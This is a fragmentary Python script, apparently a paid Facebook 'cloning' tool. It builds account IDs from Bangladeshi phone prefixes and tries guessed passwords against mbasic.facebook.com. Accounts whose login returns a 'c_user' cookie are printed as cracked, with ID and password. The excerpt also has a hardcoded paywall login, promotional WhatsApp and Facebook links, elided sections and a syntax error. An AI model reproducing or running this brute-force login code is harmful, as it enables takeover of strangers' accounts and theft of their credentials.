...
def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://www.facebook.com/UPDATE.DARK.CYBER.BD71', {
...
ha = current.day
today = date.today()
os.system('xdg-open fb://id/https://www.facebook.com/UPDATE.DARK.CYBER.BD71')
os.system('clear')
print('\x1b[1;32m             WELCOME TO HASAN NEW PAID TOOLS  \033[1;95m● \033[1;95m● \033[1;91m● \033[1;92m● \033[1;93m●')
time.sleep(1)
os.system('xdg-open https://wa.me/+8801944408580')
import getpass
...
while attemps < 12345677901:
    ...
    if username == 'SUN'and password == 'XXX',:
        print('You have successfully logged in.')
        break
    else:
        print('\033[1;35mINCORRECT THIS TOOLS IS PAID PLZ CONTACT WHATSAPP; +8801944408580')
        attemps += 1
        continue
os.system('clear')
os.system('xdg-open fb://id/https://www.facebook.com/UPDATE.DARK.CYBER.BD71')
...
\033[1;91m\033[1;41m\033[1;97m              WELCOME TO HASAN TOOLS               \033[;0m\033[1;91m\033[1;92m

\033[1;92m══════════════════════════════════════════
\033[1;32m[-] TOOLS TYPE:\033[1;32m PREMIUM
\033[1;32m[-] VERSION   :\033[1;32m 3.0
\033[1;32m[-] AUTHOR    :\033[1;32m SK JIBON HASAN
\033[1;32m[-] GITHUB    :\033[1;32m HASAN-CYBER-143
\033[1;32m[-] FACEBOOK  :\033[1;32m UPDATE.DARK.CYBER.BD71
\033[1;92m══════════════════════════════════════════
\033[1;91m<═══\033[1;41m\033[1;97m THIS NAME IS HASAN BRAND\033[;0m\033[1;91m═══>\033[1;92m"""
#os.system('espeak -a 300 " WELLCOME   TO THE   HASAN COMMAND"')
...
def C1():
    ...
    print('==============================================')
    print('[BD CODE] \033[1;92m> \033[1;92m 017 - 019 - 018 - 015-016 - 013 - 014 ')
    print('==============================================')
    code = input('\033[1;92mCHOOSE YOUR COUNTRY CODE : ')
    os.system('clear')
    print(logo)
    #os.system('espeak -a 300 " TYP YOUR CRACKED LIMITE"')
    limit = int(input('\033[1;92m[●]EXAMPLE: 1000, 3000, 5000, 15000, 20000\n\033[1;92mCHOOSE CLONING LIMIT : '))
...
def rcrack(uid,pwx,tl):
    ...
    'user-agent': 'pro',
            ...
            lo = session.post('https://mbasic.facebook.com/login/?li=WZf4Y-5ptvqkGhzX8fnGGoQo&e=1348029&shbl=1&refsrc=deprecated&_rdr',data=log_data,headers=header_mbasicfb).text
            ...
            if 'c_user' in log_cookies:
                ...
                print ('')
                print('\033[1;93m [\033[1;96mHASAN-OK🌻\033[1;93m]\033[1;91m = \033[1;96m\033[1;92m' +cid+' | '+ps+'\033[1;91m = \033[1;96m '+tahunng(cid))
        ...
        sys.stdout.write('\r%s[HASAN-KING💥]\033[1;32m-%s/%s][OK-%s]\033[1;92m[CP-%s] \r'%(bi,loop,tl,len(oks),len(cps))),sys.stdout.flush()
